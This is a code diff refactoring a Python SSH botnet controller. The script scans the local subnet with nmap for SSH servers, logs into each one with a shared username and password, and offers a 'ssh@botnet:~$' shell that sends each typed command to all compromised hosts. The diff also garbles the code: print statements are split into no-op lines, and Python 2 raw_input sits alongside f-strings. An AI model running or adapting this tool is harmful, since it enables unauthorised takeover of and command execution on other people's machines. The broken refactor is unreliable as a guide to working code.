@@ -4,70 +4,80 @@ from termcolor import colored
 from botnet import Botnet
 import optparse
 
+
 def get_arguments():
-	parser = optparse.OptionParser()
-	parser.add_option("-u", "--username", dest="user", help="Specify common username")
-	parser.add_option("-p", "--password", dest="password", help="Specify common password")
-	parser.add_option("-i", "--interface", dest="interface", help="Network interface")
+    parser = optparse.OptionParser()
+    parser.add_option("-u", "--username", dest="user", help="Specify common username")
+    parser.add_option("-p", "--password", dest="password", help="Specify common password")
+    parser.add_option("-i", "--interface", dest="interface", help="Network interface")
 
-	(options, arguments) = parser.parse_args()
-	if not options.user:
-		print "[-] Specify common username accross ssh servers\n"
-		print parser.print_help()
-		exit()
+    (options, arguments) = parser.parse_args()
+    if not options.user:
+        _extracted_from_get_arguments_9(
+            "[-] Specify common username accross ssh servers\n", parser
+        )
+    if not options.password:
+        _extracted_from_get_arguments_9(
+            "[-] Specify common password accross ssh servers\n", parser
+        )
+    if not options.interface:
+        _extracted_from_get_arguments_9("[-] Specify network interface\n", parser)
+    return options
 
-	if not options.password:
-		print "[-] Specify common password accross ssh servers\n"
-		print parser.print_help()
-		exit()
-		
-	if not options.interface:
-		print "[-] Specify network interface\n"
-		print parser.print_help()
-		exit()
 
-	return options		
+# TODO Rename this here and in `get_arguments`
+def _extracted_from_get_arguments_9(arg0, parser):
+    print
+    arg0
+    print
+    parser.print_help()
+    exit()
+
 
 def getSshServers(myip):
-	nm = nmap.PortScanner()
+    nm = nmap.PortScanner()
 
-	print "\n[*] Scanning network for ssh servers ..."
-	nm.scan(myip + '/24')
-	print "[+] Scan complete\n"
+    print
+    "\n[*] Scanning network for ssh servers ..."
+    nm.scan(f'{myip}/24')
+    print
+    "[+] Scan complete\n"
 
-	hosts = nm.all_hosts()
-	hosts.remove(myip)
+    hosts = nm.all_hosts()
+    hosts.remove(myip)
 
-	if len(hosts) == 0:
-		print "[-] No live hosts other than you found on this network"
-		exit()
+    if len(hosts) == 0:
+        print
+        "[-] No live hosts other than you found on this network"
+        exit()
 
-	ssh_servers = {}
-	for i in hosts:
-		openPorts = list(nm[i]['tcp'].keys())
-		for j in openPorts:
-			if nm[i]['tcp'][j]['name'] == 'ssh':
-				por = j
-				ssh_servers[i] = j
-				break
-			por = -1
+    ssh_servers = {}
+    for i in hosts:
+        openPorts = list(nm[i]['tcp'].keys())
+        for j in openPorts:
+            if nm[i]['tcp'][j]['name'] == 'ssh':
+                por = j
+                ssh_servers[i] = j
+                break
+            por = -1
 
-	return ssh_servers
+    return ssh_servers
+
 
 def listSshServers(ssh_servers):
-	print("Running ssh servers : ")
-	f2 = open('session.txt', 'w')
+    print("Running ssh servers : ")
+    with open('session.txt', 'w') as f2:
+        for i, j in ssh_servers.items():
+            print
+            f"Host : {i}" + "\t\t" + "port : " + str(j)
+            f2.write(f"{i}:{str(j)}" + '\n')
+        print
+        '\n'
 
-	for i, j in ssh_servers.items():
-		print "Host : " + i + "\t\t" + "port : " + str(j)
-		f2.write(i + ":" + str(j) + '\n')
-	print '\n'
-
-	f2.close()
 
 def main():
-	options = get_arguments()
-	print("""
+    options = get_arguments()
+    print("""
 Author : Goutham R
 GitHub : https://github.com/G0uth4m
 	
@@ -92,33 +102,40 @@ GitHub : https://github.com/G0uth4m
              |_____|                              
 """)
 
-	interface = options.interface
-	user = options.user
-	password = options.password
-	
-	myip = os.popen("ifconfig " + interface + " | grep \"inet \" | awk \'{print $2}\'").read().replace("\n", "")
-	ssh_servers = getSshServers(myip)
-	listSshServers(ssh_servers)
+    interface = options.interface
+    user = options.user
+    password = options.password
 
-	choice = raw_input("Continue adding bots to the botnet?[Y/n] ")
-	print("\n")
-	if(choice in ["n", "N", "no"]):
-		exit()
+    myip = (
+        os.popen(
+            f"ifconfig {interface}" + " | grep \"inet \" | awk \'{print $2}\'"
+        )
+        .read()
+        .replace("\n", "")
+    )
+    ssh_servers = getSshServers(myip)
+    listSshServers(ssh_servers)
 
-	botnet = Botnet()
-	for i,j in ssh_servers.items():
-		botnet.addBot(i, user, password, j)
+    choice = raw_input("Continue adding bots to the botnet?[Y/n] ")
+    print("\n")
+    if (choice in ["n", "N", "no"]):
+        exit()
 
-	while True:
-		strr = colored('ssh@botnet:~$ ', 'red', None, ['bold'])
-		a = raw_input(strr)
+    botnet = Botnet()
+    for i, j in ssh_servers.items():
+        botnet.addBot(i, user, password, j)
 
-		if a == "exit()" or a == "exit":
-			botnet.f.close()
-			print("\n[*] History of commands stored in logs.txt")
-			break;
-		else:	
-			botnet.sendCommandsToBots(a)
+    while True:
+        strr = colored('ssh@botnet:~$ ', 'red', None, ['bold'])
+        a = raw_input(strr)
+
+        if a in ["exit()", "exit"]:
+            botnet.f.close()
+            print("\n[*] History of commands stored in logs.txt")
+            break;
+        else:
+            botnet.sendCommandsToBots(a)
+
 
 if __name__ == "__main__":
-	main()
+    main()
